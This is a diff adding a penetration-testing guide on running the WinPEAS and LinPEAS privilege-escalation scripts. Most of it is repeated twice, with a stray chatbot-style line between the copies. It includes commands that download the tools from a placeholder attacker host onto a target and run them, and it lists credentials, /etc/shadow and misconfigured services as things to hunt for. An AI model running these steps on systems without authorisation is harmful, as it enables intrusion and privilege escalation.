@@ -1,0 +1,168 @@
+Using WinPEAS (Windows Privilege Escalation Awesome Script)
+1. Running WinPEAS on a Windows Target
+
+    Transfer WinPEAS to the Target Machine: If WinPEAS is not already on the target system, you’ll need to transfer it using methods such as:
+        PowerShell (Invoke-WebRequest or Invoke-Expression)
+        SMB (File Sharing)
+        Manual Copy (USB, shared folder)
+
+    Example using PowerShell:
+
+Invoke-WebRequest -Uri "http://<YOUR_IP>/winPEASx64.exe" -OutFile "C:\Windows\Temp\winPEASx64.exe"
+
+Run WinPEAS on the Target:
+
+    Open a Command Prompt or PowerShell on the target machine.
+    Navigate to the directory where winPEASx64.exe was saved (e.g., C:\Windows\Temp\).
+    Run the following command:
+
+C:\Windows\Temp\winPEASx64.exe
+
+    Optional Flags:
+        -a: Runs all checks (default).
+        -fast: Runs a faster set of checks.
+        -h: Displays help for all options.
+
+For example, to run all checks, you can execute:
+
+    C:\Windows\Temp\winPEASx64.exe -a
+
+Review the Output:
+
+    WinPEAS will scan the system and display results in the terminal.
+    Key things to look for:
+        Weak permissions: Misconfigured file or folder permissions (e.g., writable SYSTEM files).
+        Sensitive information: Passwords or keys stored in the registry or files.
+        Misconfigured services: Services running with elevated privileges that can be hijacked.
+        Installed software: Outdated or vulnerable versions that could be exploited for PrivEsc.
+
+Using LinPEAS (Linux Privilege Escalation Awesome Script)
+1. Running LinPEAS on a Linux Target
+
+    Transfer LinPEAS to the Target Machine: If LinPEAS isn’t already on the target system, transfer it using SCP or download it over HTTP.
+
+    Example using wget:
+
+wget http://<YOUR_IP>:8080/linpeas.sh
+
+    Alternatively, you can use SCP to copy the script to the target system.
+
+Make the Script Executable: Before running LinPEAS, ensure the script is executable.
+
+chmod +x linpeas.sh
+
+Run LinPEAS on the Target:
+
+    Execute the script in the terminal:
+
+    ./linpeas.sh
+
+    Optional Flags:
+        -q: Quiet mode (runs basic checks only).
+        -h: Displays help for all options.
+        -t: Shows a more thorough output (increased verbosity).
+
+Example to run with quiet mode:
+
+./linpeas.sh -q
+
+Review the Output:
+
+    LinPEAS will scan the system for potential privilege escalation vectors.
+    Key things to look for:
+        SUID/SGID binaries: Binaries that have escalated privileges due to incorrect configurations.
+        Writable files: Files or directories in system paths that should not be writable by regular users.
+        Kernel vulnerabilities: Known vulnerabilities related to the kernel version.
+        Scheduled tasks: Cron jobs that may be misconfigured and exploitable.
+        Sensitive files: Files containing passwords or secrets (e.g., /etc/shadow, /etc/passwd).
+
+
+Great! Now that you have WinPEAS and LinPEAS installed, here's how you can use each of them for privilege escalation (PrivEsc) testing on Windows and Linux systems.
+Using WinPEAS (Windows Privilege Escalation Awesome Script)
+1. Running WinPEAS on a Windows Target
+
+    Transfer WinPEAS to the Target Machine: If WinPEAS is not already on the target system, you’ll need to transfer it using methods such as:
+        PowerShell (Invoke-WebRequest or Invoke-Expression)
+        SMB (File Sharing)
+        Manual Copy (USB, shared folder)
+
+    Example using PowerShell:
+
+Invoke-WebRequest -Uri "http://<YOUR_IP>/winPEASx64.exe" -OutFile "C:\Windows\Temp\winPEASx64.exe"
+
+Run WinPEAS on the Target:
+
+    Open a Command Prompt or PowerShell on the target machine.
+    Navigate to the directory where winPEASx64.exe was saved (e.g., C:\Windows\Temp\).
+    Run the following command:
+
+C:\Windows\Temp\winPEASx64.exe
+
+    Optional Flags:
+        -a: Runs all checks (default).
+        -fast: Runs a faster set of checks.
+        -h: Displays help for all options.
+
+For example, to run all checks, you can execute:
+
+        C:\Windows\Temp\winPEASx64.exe -a
+
+    Review the Output:
+        WinPEAS will scan the system and display results in the terminal.
+        Key things to look for:
+            Weak permissions: Misconfigured file or folder permissions (e.g., writable SYSTEM files).
+            Sensitive information: Passwords or keys stored in the registry or files.
+            Misconfigured services: Services running with elevated privileges that can be hijacked.
+            Installed software: Outdated or vulnerable versions that could be exploited for PrivEsc.
+
+Using LinPEAS (Linux Privilege Escalation Awesome Script)
+1. Running LinPEAS on a Linux Target
+
+    Transfer LinPEAS to the Target Machine: If LinPEAS isn’t already on the target system, transfer it using SCP or download it over HTTP.
+
+    Example using wget:
+
+wget http://<YOUR_IP>:8080/linpeas.sh
+
+    Alternatively, you can use SCP to copy the script to the target system.
+
+Make the Script Executable: Before running LinPEAS, ensure the script is executable.
+
+chmod +x linpeas.sh
+
+Run LinPEAS on the Target:
+
+    Execute the script in the terminal:
+
+    ./linpeas.sh
+
+    Optional Flags:
+        -q: Quiet mode (runs basic checks only).
+        -h: Displays help for all options.
+        -t: Shows a more thorough output (increased verbosity).
+
+Example to run with quiet mode:
+
+    ./linpeas.sh -q
+
+    Review the Output:
+        LinPEAS will scan the system for potential privilege escalation vectors.
+        Key things to look for:
+            SUID/SGID binaries: Binaries that have escalated privileges due to incorrect configurations.
+            Writable files: Files or directories in system paths that should not be writable by regular users.
+            Kernel vulnerabilities: Known vulnerabilities related to the kernel version.
+            Scheduled tasks: Cron jobs that may be misconfigured and exploitable.
+            Sensitive files: Files containing passwords or secrets (e.g., /etc/shadow, /etc/passwd).
+
+General Tips for Using WinPEAS and LinPEAS
+
+    Check for Key PrivEsc Vectors: Both WinPEAS and LinPEAS will highlight common and critical vectors for privilege escalation. Pay attention to:
+        Misconfigured file and directory permissions (write access to sensitive files).
+        Outdated software that might have known exploits.
+        Exposed credentials in configuration files or environment variables.
+
+    Use the Tools Together: WinPEAS and LinPEAS can be complementary, especially in cases where you’re performing cross-platform assessments or need to confirm findings on both Windows and Linux systems.
+
+    Document Findings: Both tools produce a lot of output. Take note of the results that seem to present a viable escalation path and document them for later exploitation or reporting.
+
+    Combine with Manual Checks: While WinPEAS and LinPEAS automate many checks, always complement these tools with manual techniques for privilege escalation. Sometimes, subtle misconfigurations might not be flagged by automated tools.
